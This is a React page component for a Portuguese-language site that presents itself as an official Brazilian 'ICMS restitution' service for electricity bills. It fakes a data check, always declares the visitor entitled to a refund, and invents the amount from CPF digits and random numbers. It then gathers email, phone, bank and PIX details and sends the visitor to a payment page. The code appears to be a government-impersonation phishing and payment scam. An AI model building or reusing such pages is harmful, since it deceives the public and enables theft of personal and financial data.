import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { CheckCircle, Download, AlertTriangle, AlertCircle, CalendarClock, ChevronRight, Phone, Mail, BanknoteIcon, CreditCard, ChevronLeft, CircleDollarSign } from "lucide-react";
import SimuladorRestituicao from "@/components/SimuladorRestituicao";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";

// Schemas para validação
const contatoSchema = z.object({
  email: z.string().email("E-mail inválido").min(1, "E-mail é obrigatório"),
  telefone: z.string()
    .min(10, "Telefone deve ter pelo menos 10 dígitos")
    .max(17, "Telefone inválido")
    .regex(/[\d\s\(\)\-]+/, "Formato inválido de telefone"),
});

const dadosBancariosSchema = z.object({
  banco: z.string().min(1, "Selecione um banco"),
  chavePix: z.string()
    .min(11, "CPF deve ter 11 dígitos")
    .max(11, "CPF deve ter 11 dígitos")
    .regex(/^\d+$/, "CPF deve conter apenas números"),
});

// Lista de bancos brasileiros para o select
const bancosBrasileiros = [
  { id: "bb", nome: "Banco do Brasil" },
  { id: "caixa", nome: "Caixa Econômica Federal" },
  { id: "itau", nome: "Itaú Unibanco" },
  { id: "bradesco", nome: "Bradesco" },
  { id: "santander", nome: "Santander" },
  { id: "nubank", nome: "Nubank" },
  { id: "inter", nome: "Banco Inter" },
  { id: "c6", nome: "C6 Bank" },
  { id: "banrisul", nome: "Banrisul" },
  { id: "safra", nome: "Safra" },
  { id: "original", nome: "Banco Original" },
  { id: "bndes", nome: "BNDES" },
  { id: "sicoob", nome: "Sicoob" },
  { id: "sicredi", nome: "Sicredi" },
  { id: "other", nome: "Outro" },
];

type ContatoFormValues = z.infer<typeof contatoSchema>;
type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;

export default function Resultado() {
  const [location, navigate] = useLocation();
  // Extrair parâmetros de consulta da URL atual
  const query = new URLSearchParams(window.location.search);
  
  const [isLoading, setIsLoading] = useState(true);
  const [progresso, setProgresso] = useState(0);
  const [activeTab, setActiveTab] = useState("dados");
  
  // Dados do usuário da URL
  const cpf = query.get("cpf") || "";
  const nome = query.get("nome") || "";
  
  // Dados da simulação
  const [simulacaoRealizada, setSimulacaoRealizada] = useState(false);
  
  // Dados extras
  const [estado, setEstado] = useState(query.get("estado") || "Minas Gerais");
  const [companhia, setCompanhia] = useState(query.get("companhia") || "CEMIG");
  const [dataNascimento, setDataNascimento] = useState("");
  
  // Dados calculados da restituição
  const [valorTotal, setValorTotal] = useState(0);
  const [mesesAvaliados, setMesesAvaliados] = useState(0);
  const [dataPagamento, setDataPagamento] = useState("");
  
  // Estados para o fluxo de confirmação
  const [etapaConfirmacao, setEtapaConfirmacao] = useState<"inicial" | "contato" | "bancarios" | "confirmacao">("inicial");
  const [animacaoAtiva, setAnimacaoAtiva] = useState(false);
  const [valorRestituicao, setValorRestituicao] = useState("");
  
  // Dados de contato e bancários
  const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
  const [emailConfirmado, setEmailConfirmado] = useState("");
  const [bancoSelecionado, setBancoSelecionado] = useState("");
  const [chavePix, setChavePix] = useState("");
  
  // Inicializar toast
  const { toast } = useToast();
  
  // Função para formatar CPF
  const formatarCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };
  
  // Função para formatar valor em reais
  const formatarValor = (valor: number) => {
    return valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };
  
  // Definir data de nascimento do usuário a partir dos dados da API
  useEffect(() => {
    if (query.get("nasc")) {
      const nascimento = query.get("nasc") || "";
      // A data já vem formatada como string DD/MM/YYYY, não precisa converter
      setDataNascimento(nascimento);
    } else {
      // Se não tiver data de nascimento na URL, usamos uma padrão para teste
      setDataNascimento("01/01/1990");
    }
  }, [query]);
  
  // Detectar estado e companhia baseado no IP do usuário apenas se não tiverem vindo no URL
  useEffect(() => {
    // Se já temos os dados da URL, não precisamos detectar
    if (query.get("estado") && query.get("companhia")) {
      return;
    }
    
    const detectarLocalizacao = async () => {
      try {
        // Em um cenário real, usaríamos um serviço de geolocalização por IP
        // Para simplificar, usamos valores padrão
        if (!query.get("estado")) {
          setEstado("Minas Gerais");
        }
        
        if (!query.get("companhia")) {
          setCompanhia("CEMIG");
        }
        
        // Simulação de chamada bem-sucedida
        console.log("Estado detectado pelo IP:", estado);
      } catch (error) {
        console.error("Erro ao detectar localização:", error);
        // Manter os valores padrão em caso de erro
      }
    };
    
    detectarLocalizacao();
  }, [query]);
  
  // Simulação inicial de cálculo da restituição (para a tab "dados")
  useEffect(() => {
    // Verificar se temos CPF e nome
    if (!cpf || !nome) {
      navigate("/verificar");
      return;
    }
    
    // Simulação de carregamento
    const timer = setInterval(() => {
      setProgresso(oldProgress => {
        if (oldProgress >= 100) {
          clearInterval(timer);
          return 100;
        }
        return oldProgress + 10;
      });
    }, 600);
    
    // Simulação de cálculo concluído
    setTimeout(() => {
      // Gerando valores aleatórios para demonstração
      const baseValue = (parseInt(cpf.slice(-4)) % 30) * 100 + 1500; // Valor entre R$ 1.500 e R$ 4.500
      const meses = Math.floor(Math.random() * 36) + 24; // Entre 24 e 60 meses (2 a 5 anos)
      
      // Calcular data de pagamento (entre 30 e 90 dias no futuro)
      const diasParaPagamento = Math.floor(Math.random() * 60) + 30;
      const dataPgto = new Date();
      dataPgto.setDate(dataPgto.getDate() + diasParaPagamento);
      
      setValorTotal(baseValue);
      setMesesAvaliados(meses);
      setDataPagamento(dataPgto.toLocaleDateString('pt-BR'));
      setIsLoading(false);
      
      clearInterval(timer);
      setProgresso(100);
    }, 3000); // Reduzido para 3 segundos para melhor experiência do usuário
    
    return () => clearInterval(timer);
  }, [cpf, nome, navigate]);
  
  // Função para gerar o PDF de comprovante
  const gerarComprovante = () => {
    alert("Seu comprovante será enviado para o e-mail cadastrado junto à Receita Federal.");
  };
  
  // Formulário de contato
  const contatoForm = useForm<ContatoFormValues>({
    resolver: zodResolver(contatoSchema),
    defaultValues: {
      email: "",
      telefone: "",
    },
  });

  // Formulário de dados bancários
  const dadosBancariosForm = useForm<DadosBancariosFormValues>({
    resolver: zodResolver(dadosBancariosSchema),
    defaultValues: {
      banco: "",
      chavePix: "",
    },
  });
  
  // Formatar telefone para visualização
  const formatarTelefone = (telefone: string) => {
    if (!telefone) return "";
    
    // (XX) XXXXX-XXXX
    if (telefone.length === 11) {
      return `(${telefone.substring(0, 2)}) ${telefone.substring(
        2,
        7
      )}-${telefone.substring(7)}`;
    }
    
    return telefone;
  };
  
  // Enviar dados de contato e ir para próxima etapa
  const onSubmitContato = async (data: ContatoFormValues) => {
    try {
      // Animação de transição
      setAnimacaoAtiva(true);
      
      // Atualizar estado
      setTelefoneConfirmado(data.telefone);
      setEmailConfirmado(data.email);
      
      // Ir para próxima etapa com atraso para animação
      setTimeout(() => {
        setEtapaConfirmacao("bancarios");
        setAnimacaoAtiva(false);
      }, 300);
      
      // Mostrar toast
      toast({
        title: "Dados salvos com sucesso!",
        description: "Agora vamos para os dados bancários.",
      });
    } catch (error) {
      setAnimacaoAtiva(false);
      toast({
        variant: "destructive",
        title: "Erro ao salvar dados",
        description: "Não foi possível salvar seus dados. Tente novamente.",
      });
    }
  };
  
  // Submeter dados bancários
  const onSubmitDadosBancarios = (data: DadosBancariosFormValues) => {
    // Animação de transição
    setAnimacaoAtiva(true);
    
    setBancoSelecionado(
      bancosBrasileiros.find((banco) => banco.id === data.banco)?.nome || ""
    );
    setChavePix(data.chavePix);
    
    setTimeout(() => {
      setEtapaConfirmacao("confirmacao");
      setAnimacaoAtiva(false);
    }, 300);
  };
  
  // Finalizar processo
  const finalizarProcesso = () => {
    // Animação de transição
    setAnimacaoAtiva(true);
    
    // Força a redireção para a página de pagamento após 500ms
    setTimeout(() => {
      // Obtém os parâmetros da URL atual
      const urlParams = new URLSearchParams(window.location.search);
      const nasc = urlParams.get('nasc') || '';
      const companhia = urlParams.get('companhia') || '';
      const estado = urlParams.get('estado') || '';
      
      // Constrói a URL com todos os dados necessários
      const banco = bancoSelecionado.toLowerCase().includes('brasil') ? 'bb' : 
                 bancoSelecionado.toLowerCase().includes('caixa') ? 'caixa' : 
                 bancoSelecionado.toLowerCase().includes('itau') ? 'itau' : 
                 bancoSelecionado.toLowerCase().includes('santander') ? 'santander' : 
                 bancoSelecionado.toLowerCase().includes('bradesco') ? 'bradesco' : 'bb';
      
      const url = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorTotal)}&nasc=${encodeURIComponent(nasc)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&banco=${encodeURIComponent(banco)}`;
      
      // Logging para debug
      console.log("Redirecionando para URL:", url);
      
      window.location.href = url;
    }, 500);
  };
  
  // Função chamada quando a simulação é concluída
  const handleSimulacaoConcluida = (valor: number, meses: number) => {
    setValorTotal(valor);
    setMesesAvaliados(meses);
    
    // Calcular data de pagamento (30 dias no futuro)
    const dataPgto = new Date();
    dataPgto.setDate(dataPgto.getDate() + 30);
    setDataPagamento(dataPgto.toLocaleDateString('pt-BR'));
    
    // Formatar valor para exibição
    setValorRestituicao(formatarValor(valor));
    
    setSimulacaoRealizada(true);
    // Não mudamos mais de aba para manter o usuário no fluxo do simulador
    // setActiveTab("dados");
    
    // Iniciar processo de confirmação
    setEtapaConfirmacao("contato");
  };
  
  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-[var(--gov-gray-light)] py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <Card className="shadow-lg overflow-hidden">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-8">
                <CardTitle className="text-2xl font-bold">Restituição de ICMS</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Consulte seus direitos e simule o valor da sua restituição
                </CardDescription>
              </CardHeader>
              
              <Tabs defaultValue="dados" value={activeTab} onValueChange={(value) => {
                  // Previne voltar para "dados" se a simulação já foi realizada
                  if (simulacaoRealizada && value === "dados") {
                    return; // Não faz nada se tentar mudar para "dados" com a simulação realizada
                  }
                  setActiveTab(value);
                }} className="w-full">
                <div className="border-b px-6">
                  <TabsList className="bg-transparent border-b-0 p-0">
                    <TabsTrigger 
                      value="dados" 
                      disabled={simulacaoRealizada}
                      className={`data-[state=active]:text-[var(--gov-blue)] data-[state=active]:border-b-2 data-[state=active]:border-[var(--gov-blue)] rounded-none py-4 ${
                        simulacaoRealizada ? "opacity-50 cursor-not-allowed" : ""
                      }`}
                    >
                      Dados Pessoais
                    </TabsTrigger>
                    <TabsTrigger 
                      value="simulador" 
                      className="data-[state=active]:text-[var(--gov-blue)] data-[state=active]:border-b-2 data-[state=active]:border-[var(--gov-blue)] rounded-none py-4"
                    >
                      Simulador de Restituição
                    </TabsTrigger>
                  </TabsList>
                </div>
                
                <TabsContent value="dados" className="p-6">
                  {isLoading ? (
                    <div className="text-center py-8">
                      <h3 className="text-lg font-semibold mb-4 text-[var(--gov-blue-dark)]">
                        Verificando seus dados...
                      </h3>
                      <Progress value={progresso} className="h-2 mb-4" />
                      <p className="text-sm text-[var(--gov-gray-dark)]">
                        Estamos consultando suas informações para verificar o direito à restituição.
                      </p>
                    </div>
                  ) : (
                    <>
                      <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8 flex items-start">
                        <CheckCircle className="text-green-500 mr-3 mt-1 h-5 w-5 flex-shrink-0" />
                        <div>
                          <h3 className="font-semibold text-green-800">Verificação Concluída!</h3>
                          <p className="text-sm text-green-700">
                            Seus dados foram verificados e você tem direito à restituição do ICMS.
                          </p>
                        </div>
                      </div>
                      
                      <div className="space-y-6">
                        {/* Dados do Solicitante */}
                        <div className="border-b pb-4">
                          <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
                            Dados do Solicitante
                          </h3>
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                              <p className="text-sm text-[var(--gov-gray-dark)]">Nome Completo:</p>
                              <p className="font-medium">{nome}</p>
                            </div>
                            <div>
                              <p className="text-sm text-[var(--gov-gray-dark)]">CPF:</p>
                              <p className="font-medium">{formatarCPF(cpf)}</p>
                            </div>
                            <div>
                              <p className="text-sm text-[var(--gov-gray-dark)]">Data de Nascimento:</p>
                              <p className="font-medium">{dataNascimento}</p>
                            </div>
                            <div>
                              <p className="text-sm text-[var(--gov-gray-dark)]">Estado:</p>
                              <p className="font-medium">{estado}</p>
                            </div>
                            <div>
                              <p className="text-sm text-[var(--gov-gray-dark)]">Companhia Elétrica:</p>
                              <p className="font-medium">{companhia}</p>
                            </div>
                          </div>
                        </div>
                        
                        {simulacaoRealizada ? (
                          <>
                            {/* Detalhes da Restituição (após simulação) */}
                            <div className="border-b pb-4">
                              <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
                                Detalhes da Restituição
                              </h3>
                              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                  <p className="text-sm text-[var(--gov-gray-dark)]">Período Analisado:</p>
                                  <p className="font-medium">{mesesAvaliados} meses</p>
                                </div>
                                <div>
                                  <p className="text-sm text-[var(--gov-gray-dark)]">Data de Pagamento Prevista:</p>
                                  <p className="font-medium flex items-center">
                                    <CalendarClock className="h-4 w-4 mr-1 text-[var(--gov-blue)]" />
                                    {dataPagamento}
                                  </p>
                                </div>
                                <div className="md:col-span-2">
                                  <p className="text-sm text-[var(--gov-gray-dark)]">Valor Total da Restituição:</p>
                                  <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">
                                    {formatarValor(valorTotal)}
                                  </p>
                                </div>
                              </div>
                            </div>
                            
                            {/* Formulário de Confirmação */}
                            <div className="mt-8">
                              <div className="text-center mb-6">
                                <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)] mb-2">
                                  Olá {nome.split(" ")[0]}, você está quase lá!
                                </h1>
                                <p className="text-[var(--gov-gray-dark)] mb-2">
                                  Complete suas informações para receber sua restituição
                                </p>
                                <div className="mb-2 text-lg text-[var(--gov-blue-dark)]">no valor de</div>
                                <div className="text-4xl font-bold bg-gradient-to-r from-green-600 to-blue-600 text-transparent bg-clip-text">{valorRestituicao}</div>
                              </div>

                              {/* Progresso visual elegante */}
                              <div className="flex items-center justify-center mb-8">
                                <div className="flex space-x-1 w-full max-w-md">
                                  <div 
                                    className={`h-2 flex-1 rounded-l-full transition-all duration-500 ${
                                      etapaConfirmacao === "contato" 
                                        ? "bg-[var(--gov-blue-dark)]" 
                                        : etapaConfirmacao === "bancarios" || etapaConfirmacao === "confirmacao" 
                                          ? "bg-[var(--gov-blue)]" 
                                          : "bg-gray-200"
                                    }`}
                                  ></div>
                                  <div 
                                    className={`h-2 flex-1 transition-all duration-500 ${
                                      etapaConfirmacao === "bancarios" 
                                        ? "bg-[var(--gov-blue-dark)]" 
                                        : etapaConfirmacao === "confirmacao" 
                                          ? "bg-[var(--gov-blue)]" 
                                          : "bg-gray-200"
                                    }`}
                                  ></div>
                                  <div 
                                    className={`h-2 flex-1 rounded-r-full transition-all duration-500 ${
                                      etapaConfirmacao === "confirmacao" 
                                        ? "bg-[var(--gov-blue-dark)]" 
                                        : "bg-gray-200"
                                    }`}
                                  ></div>
                                </div>
                              </div>
                              
                              {/* Etapas em texto - versão desktop */}
                              <div className="hidden md:flex justify-between mb-8 px-2 max-w-md mx-auto">
                                <div className={`text-sm font-medium transition-all duration-300 ${
                                  etapaConfirmacao === "contato" ? "text-[var(--gov-blue-dark)]" : 
                                  etapaConfirmacao === "bancarios" || etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
                                }`}>
                                  Seus dados
                                </div>
                                <div className={`text-sm font-medium transition-all duration-300 ${
                                  etapaConfirmacao === "bancarios" ? "text-[var(--gov-blue-dark)]" : 
                                  etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
                                }`}>
                                  Dados bancários
                                </div>
                                <div className={`text-sm font-medium transition-all duration-300 ${
                                  etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue-dark)]" : "text-gray-500"
                                }`}>
                                  Finalizar
                                </div>
                              </div>
                              
                              {/* Etapas em texto - versão mobile */}
                              <div className="flex md:hidden justify-center mb-8 px-2 max-w-md mx-auto">
                                <div className="text-center">
                                  <span className="font-medium text-[var(--gov-blue-dark)]">
                                    {etapaConfirmacao === "contato" ? "Etapa 1/3: Seus dados" : 
                                     etapaConfirmacao === "bancarios" ? "Etapa 2/3: Dados bancários" : 
                                     "Etapa 3/3: Finalizar"}
                                  </span>
                                </div>
                              </div>
                              
                              {/* Conteúdo da etapa atual */}
                              <div className="bg-white rounded-lg p-4">
                                {etapaConfirmacao === "contato" && (
                                  <div className={animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"}>
                                    <Form {...contatoForm}>
                                      <form onSubmit={contatoForm.handleSubmit(onSubmitContato)} className="space-y-6">
                                        <div className="space-y-4">
                                          <div className="flex items-center mb-4 p-3 bg-blue-50 rounded-lg">
                                            <Mail className="h-5 w-5 text-blue-500 mr-3 flex-shrink-0" />
                                            <p className="text-blue-700 text-sm">Seus dados serão usados apenas para o processo de restituição e não serão compartilhados com terceiros.</p>
                                          </div>
                                          
                                          <FormField
                                            control={contatoForm.control}
                                            name="email"
                                            render={({ field }) => (
                                              <FormItem>
                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">E-mail</FormLabel>
                                                <FormControl>
                                                  <Input
                                                    placeholder="seu.email@exemplo.com"
                                                    type="email"
                                                    className="border-[var(--gov-gray)] focus-visible:ring-[var(--gov-blue)] transition-all"
                                                    {...field}
                                                  />
                                                </FormControl>
                                                <FormDescription>
                                                  Precisamos do seu e-mail para enviar atualizações sobre o processo
                                                </FormDescription>
                                                <FormMessage />
                                              </FormItem>
                                            )}
                                          />

                                          <FormField
                                            control={contatoForm.control}
                                            name="telefone"
                                            render={({ field }) => (
                                              <FormItem>
                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Celular com WhatsApp</FormLabel>
                                                <FormControl>
                                                  <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
                                                    <Phone className="ml-3 h-4 w-4 text-gray-400" />
                                                    <Input
                                                      placeholder="(11) 9 8888 8888"
                                                      type="tel"
                                                      maxLength={17}
                                                      className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                                                      onChange={(e) => {
                                                        // Aplicar a máscara (11) 9 8888 8888
                                                        let value = e.target.value.replace(/\D/g, ''); // Remove todos os não-dígitos
                                                        if (value.length > 0) {
                                                          // Aplicar a máscara conforme o usuário digita
                                                          value = value.replace(/^(\d{2})(\d)/g, '($1) $2'); // Coloca parênteses e espaço no DDD
                                                          if (value.length > 3) {
                                                            value = value.replace(/(\(\d{2}\) )(\d)/, '$1$2 '); // Adiciona espaço após o 9
                                                          }
                                                          if (value.length > 5) {
                                                            value = value.replace(/(\(\d{2}\) \d )(\d{4})/, '$1$2 '); // Adiciona espaço após os primeiros 4 dígitos
                                                          }
                                                          if (value.length > 16) {
                                                            value = value.substring(0, 16); // Limita ao tamanho máximo
                                                          }
                                                        }
                                                        field.onChange(value);
                                                      }}
                                                      value={field.value}
                                                    />
                                                  </div>
                                                </FormControl>
                                                <FormDescription>
                                                  Número para contato sobre sua restituição
                                                </FormDescription>
                                                <FormMessage />
                                              </FormItem>
                                            )}
                                          />
                                        </div>

                                        <div className="flex justify-end mt-6">
                                          <Button 
                                            type="submit" 
                                            className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
                                          >
                                            Continuar
                                            <ChevronRight className="ml-2 h-4 w-4" />
                                          </Button>
                                        </div>
                                      </form>
                                    </Form>
                                  </div>
                                )}
                                
                                {etapaConfirmacao === "bancarios" && (
                                  <div className={animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"}>
                                    <div className="mb-4 bg-amber-50 rounded-lg p-4 border-l-4 border-amber-500">
                                      <div className="flex items-start">
                                        <BanknoteIcon className="h-5 w-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0" />
                                        <div>
                                          <h3 className="text-amber-700 font-semibold">Informações bancárias</h3>
                                          <p className="text-amber-600 text-sm mt-1">
                                            Selecione seu banco e informe o CPF associado à sua chave PIX para receber a restituição
                                          </p>
                                        </div>
                                      </div>
                                    </div>
                                    
                                    <Form {...dadosBancariosForm}>
                                      <form onSubmit={dadosBancariosForm.handleSubmit(onSubmitDadosBancarios)} className="space-y-6">
                                        <div className="space-y-4">
                                          <FormField
                                            control={dadosBancariosForm.control}
                                            name="banco"
                                            render={({ field }) => (
                                              <FormItem>
                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Banco</FormLabel>
                                                <Select
                                                  onValueChange={field.onChange}
                                                  defaultValue={field.value}
                                                >
                                                  <FormControl>
                                                    <SelectTrigger className="border-[var(--gov-gray)] focus:border-[var(--gov-blue)] transition-all">
                                                      <SelectValue placeholder="Selecione seu banco" />
                                                    </SelectTrigger>
                                                  </FormControl>
                                                  <SelectContent className="max-h-80">
                                                    {bancosBrasileiros.map((banco) => (
                                                      <SelectItem key={banco.id} value={banco.id}>
                                                        {banco.nome}
                                                      </SelectItem>
                                                    ))}
                                                  </SelectContent>
                                                </Select>
                                                <FormDescription>
                                                  Selecione o banco onde você receberá o valor da restituição
                                                </FormDescription>
                                                <FormMessage />
                                              </FormItem>
                                            )}
                                          />

                                          <FormField
                                            control={dadosBancariosForm.control}
                                            name="chavePix"
                                            render={({ field }) => (
                                              <FormItem>
                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Chave PIX (CPF)</FormLabel>
                                                <FormControl>
                                                  <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
                                                    <CreditCard className="ml-3 h-4 w-4 text-gray-400" />
                                                    <Input
                                                      placeholder="Seu CPF sem pontos ou traços"
                                                      inputMode="numeric"
                                                      maxLength={11}
                                                      className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                                                      {...field}
                                                    />
                                                  </div>
                                                </FormControl>
                                                <FormDescription>
                                                  A restituição será enviada para a chave PIX associada ao seu CPF
                                                </FormDescription>
                                                <FormMessage />
                                              </FormItem>
                                            )}
                                          />
                                        </div>

                                        <div className="flex justify-end mt-6">
                                          <Button 
                                            type="submit" 
                                            className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
                                          >
                                            Continuar
                                            <ChevronRight className="ml-2 h-4 w-4" />
                                          </Button>
                                        </div>
                                      </form>
                                    </Form>
                                  </div>
                                )}
                                
                                {etapaConfirmacao === "confirmacao" && (
                                  <div className={`${animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"} space-y-6`}>
                                    <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
                                      <h3 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4 flex items-center">
                                        <CircleDollarSign className="h-5 w-5 mr-2 text-green-500" />
                                        Resumo da Solicitação
                                      </h3>
                                      
                                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                                        <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
                                          <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                                            Dados Pessoais
                                          </h4>
                                          <div className="space-y-2">
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Nome:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{nome}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{dataNascimento}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Email:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{emailConfirmado}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Telefone:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{formatarTelefone(telefoneConfirmado)}</span>
                                            </div>
                                          </div>
                                        </div>
                                        
                                        <div className="bg-green-50 p-4 rounded-lg border border-green-100">
                                          <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                                            Dados da Conta de Luz
                                          </h4>
                                          <div className="space-y-2">
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Estado:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{estado}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Companhia:</span>
                                              <span className="font-medium text-[var(--gov-blue-dark)]">{companhia}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm">
                                              <span className="text-[var(--gov-gray-dark)]">Valor a Receber:</span>
                                              <span className="font-bold text-green-600">{valorRestituicao}</span>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                      
                                      <div className="bg-amber-50 p-4 rounded-lg border border-amber-100 mb-4">
                                        <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                                          Dados Bancários
                                        </h4>
                                        <div className="space-y-2">
                                          <div className="flex justify-between items-center text-sm">
                                            <span className="text-[var(--gov-gray-dark)]">Banco:</span>
                                            <span className="font-medium text-[var(--gov-blue-dark)]">{bancoSelecionado}</span>
                                          </div>
                                          <div className="flex justify-between items-center text-sm">
                                            <span className="text-[var(--gov-gray-dark)]">Chave PIX (CPF):</span>
                                            <span className="font-medium text-[var(--gov-blue-dark)]">{formatarCPF(chavePix)}</span>
                                          </div>
                                        </div>
                                      </div>
                                      
                                      <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-r-lg mb-6">
                                        <div className="flex items-start">
                                          <AlertCircle className="h-5 w-5 text-yellow-500 mt-0.5 mr-2 flex-shrink-0" />
                                          <p className="text-sm text-yellow-700">
                                            Ao confirmar, você declara que as informações fornecidas são verdadeiras e concorda
                                            com os termos do processo de restituição do ICMS cobrado indevidamente.
                                          </p>
                                        </div>
                                      </div>
                                      
                                      <div className="flex justify-center mt-6">
                                        <Button 
                                          onClick={finalizarProcesso}
                                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold py-6 px-8 text-lg rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
                                        >
                                          <CheckCircle className="mr-2 h-5 w-5" />
                                          Confirmar e Finalizar
                                        </Button>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </div>
                            </div>
                          </>
                        ) : (
                          // Opção para iniciar simulação
                          <div className="py-6 text-center">
                            <p className="mb-4 text-[var(--gov-gray-dark)]">
                              Para calcular o valor exato da sua restituição, prossiga para a simulação
                              fornecendo informações sobre sua conta de energia.
                            </p>
                            <Button 
                              onClick={() => setActiveTab("simulador")}
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-semibold px-6 py-2"
                            >
                              Prosseguir para Simulação
                              <ChevronRight className="ml-2 h-4 w-4" />
                            </Button>
                          </div>
                        )}
                        
                      </div>
                    </>
                  )}
                </TabsContent>
                
                <TabsContent value="simulador" className="p-6">
                  <SimuladorRestituicao 
                    cpf={cpf}
                    nome={nome}
                    companhia={companhia}
                    estado={estado}
                    dataNascimento={dataNascimento}
                    onSimulacaoConcluida={handleSimulacaoConcluida}
                  />
                </TabsContent>
              </Tabs>
            </Card>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}